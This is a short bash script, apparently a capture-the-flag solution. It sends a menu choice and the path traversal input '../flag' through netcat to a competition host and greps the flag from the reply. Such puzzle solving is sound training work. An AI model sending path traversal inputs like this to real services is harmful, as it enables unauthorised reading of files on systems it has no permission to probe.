#!/bin/bash

# Connect to the link, go to the second option, and enter ../flag
echo -e "2\n../flag" | nc -w 1 mngmnt-iface.ctfcompetition.com 1337 | grep 'CTF' | cut -d\= -f1
